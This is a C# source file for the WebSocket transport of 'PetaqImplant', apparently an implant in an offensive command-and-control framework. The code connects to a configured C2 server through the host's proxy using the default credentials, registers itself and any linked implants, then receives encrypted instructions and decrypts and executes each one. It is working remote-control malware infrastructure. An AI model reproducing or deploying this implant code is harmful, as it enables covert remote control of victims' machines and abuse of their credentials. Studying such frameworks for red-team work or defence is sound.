using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PetaqImplant
{
    public class WebSocketServiceSocket : ImplantServiceSocket
    {
        public static ClientWebSocket webSocket;
        private const int receiveChunkSize = 300000;

        public override void Start()
        {
            Console.WriteLine("Connecting to {0}", Program.configuration["C2CONF"]);

            // create a websocket object
            webSocket = new ClientWebSocket();

            // get the default proxy if there is
            webSocket.Options.Proxy = new System.Net.WebProxy();

            // get the credentials for the proxy if there is
            webSocket.Options.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;

            // connect to the websocket in configuration
            Console.Error.WriteLine("Linking to the C2 via websocket... ");
            webSocket.ConnectAsync(new Uri(Program.configuration["C2CONF"]), CancellationToken.None).Wait();
            Console.WriteLine("The websocket connection is successfully established.");

            // register the implant information
            Program.Register();

            // regist the the linked implants
            Program.RegisterLinkedImplants();

            // ask registration from all linked implants
            Program.AskRegistrationsFromAllLinkedImplants();

            // ask route updates from all linked implants
            Program.AskRouteUpdatesFromAllLinkedImplants();

            StartAsync().Wait();
        }

        public override bool Send(string data = "")
        {
            if (data == "") return false;
            SendAsync(data).Wait();
            return true;
        }

        public async Task StartAsync()
        {
            await Task.WhenAll(Receive(), SendAsync());
        }

        public async Task SendAsync(string data = "")
        {
            if (data == "") return;

            byte[] sbuffer = Encoding.UTF8.GetBytes(data);
            try
            {
                await webSocket.SendAsync(new ArraySegment<byte>(sbuffer), WebSocketMessageType.Text, true, CancellationToken.None);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Socket is unreachable. {0}",e);
                StopAsync().Wait();
            }
        }

        public async Task Receive()
        {
            try
            {
                while (webSocket.State == WebSocketState.Open)
                {
                    Console.Error.WriteLine("Waiting for an instruction...");
                    byte[] rbuffer = new byte[receiveChunkSize];
                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                    string instruction = (string)Encoding.UTF8.GetString(rbuffer).Replace("\0", string.Empty);
                    instruction = Common.Decrypt(instruction);
                    Console.Error.WriteLine("Got an instruction:\n{0}",instruction);
                    PetaqImplant.Instructions.Instruct(instruction);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        Console.Error.WriteLine("Socket is closing...");
                        await StopAsync();
                    }

                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("The service stopped responding: {0}", e);
                await StopAsync();
            }
        }

        public override void Stop()
        {
            StopAsync().Wait();
        }

        public async Task StopAsync()
        {
            Program.ConsoleReset();
            Console.Error.WriteLine("The C2 socket is closing.");
            try
            {
                await webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Failed to close the async socket. {0}", e);
            }
        }
    }
}
